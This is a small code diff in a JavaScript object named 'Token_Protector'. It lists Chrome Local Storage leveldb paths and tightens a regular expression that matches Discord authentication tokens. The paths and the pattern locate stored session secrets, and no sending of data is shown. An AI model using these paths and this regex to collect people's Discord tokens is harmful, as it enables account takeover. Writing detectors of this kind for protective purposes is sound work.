@@ -18,7 +18,7 @@ const Token_Protector = {
         `${Homedir}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb`,
         `${Homedir}\\twwtwtwt\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb`
     ],
-    discord_tokens_regex: new RegExp(/mfa\.\w+|(?!B.)\w+\.\w+\.[a-z][A-Z]\w+.\w+/, "g")
+    discord_tokens_regex: new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}/, "g")
 }
 
 //Functions
